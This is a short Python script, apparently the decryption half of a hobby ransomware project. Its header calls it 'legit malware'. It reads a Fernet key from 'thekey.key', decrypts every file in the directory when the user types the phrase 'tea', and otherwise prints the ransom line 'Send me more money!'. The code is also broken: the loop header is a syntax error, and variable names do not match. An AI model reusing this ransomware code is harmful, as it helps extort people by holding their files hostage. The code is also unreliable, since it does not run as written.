#!/usr/bin/python3

# Do not exeute this script
# this is a legit malware and can destroy your data
# with great power comes great responsibility.


import os
from cryptography.fernet import Fernet
#let's find some files

files = []

#goes through every single file in  a directory
for files is os.listdir():
	if file == "ransomware.py" or file == "thekey.key" or file == "decrypt.py":
		continue
#checks if something is  file. IF file add to the list
	if os.path.isfile(file):
		files.append(file)


with open("thekey.key", "rb") as key:
	secretkey = key.read()


secret_phrase = "tea"
user_phrase = input("Enter secret phrase to decrypt your files\n")

if user_phrase == secret_phrase:

	for file in files:
		with open(file, "rb") as thefile:
			content = thefile.read()
		contents_decrypted = Fernet(secretkey).decrypt(contents)
		with open(file, "wb") as thefile:
			thefile.write(contents_decrypted)
	print("Congrats, files are decrypted.")
else:
	print("Send me more money!")
